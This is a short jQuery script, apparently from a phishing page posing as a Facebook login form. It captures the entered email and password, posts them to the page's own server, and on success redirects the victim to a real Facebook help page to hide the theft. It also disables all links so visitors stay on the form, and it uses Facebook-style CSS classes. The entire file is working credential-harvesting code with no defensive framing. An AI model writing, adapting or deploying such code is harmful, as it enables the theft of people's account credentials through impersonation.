$('#login_form').submit(function (event) {
    event.preventDefault();

    var email = $('#email').val().trim();
    var pass = $('#pass').val().trim();

    disable();

    var chk = (  email == null || pass == null || (email.length <= 2 || pass.length < 6) );
    if (chk) {
        enable();
        return;
    }

    $.ajax({
        url:'/',
        type:'POST',
        data:{
            email:email,
            pass:pass
        },
        success:function (data) {
            if(data == 'success') {location.href = '//www.facebook.com/business/help/182371508761821';
                                 // close();
                                  }
        }
    });


});

function disable() {
    $('#loginbutton').attr('disabled','')
        .addClass('_51sy _42fr');
}

function enable() {
    $('#loginbutton').removeAttr('disabled')
        .removeClass('_51sy _42fr');
}

$('a').click(function (event) {
    if (this.href == '/') return;
    event.preventDefault();

    $('#email').focus();
    scroll(0,0);
});

$(function () {
     $('#email').focus();
    scroll(0,0);
});
